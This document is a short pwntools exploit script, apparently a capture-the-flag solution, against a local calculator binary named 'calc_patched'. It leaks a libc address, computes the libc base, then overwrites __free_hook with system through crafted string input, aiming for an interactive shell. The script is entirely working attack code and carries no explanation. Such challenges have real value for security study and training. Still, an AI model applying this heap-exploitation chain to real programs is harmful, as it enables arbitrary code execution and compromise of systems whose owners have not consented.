from pwn import *

target = "./calc_patched"
libc = ELF("/lib/i386-linux-gnu/libc-2.24.so")
p = process(target, env={"LD_PRELOAD":"./libc.so.6"})
print p.recv()

#leak
p.sendline("a")
print p.recv()
p.sendline("")
print p.recv()
p.sendline("")
leak = u32(p.recvline()[:-1])
libc_base = leak - 0x1b77b0 + 0x4000
log.info("leak : {}".format(hex(leak)))
log.info("libc base : {}".format(hex(libc_base)))
print p.recv()


free_hook = libc_base + 0x1b48b0
system = libc_base + libc.symbols['system']

print "system : " + hex(system)
print "free hook : " + hex(free_hook)
p.sendline("a=\"aaaaaaaa\"")
print p.recv()
p.sendline("a=99")
print p.recv()
p.sendline("a=\""+"b"*16+p32(free_hook)+"yyyy\x0c"+"\"")
print p.recv()
raw_input()
p.sendline("a=\"bbbb\"")
#print p.recv()
#p.sendline("/bin/sh\x00")
p.interactive()
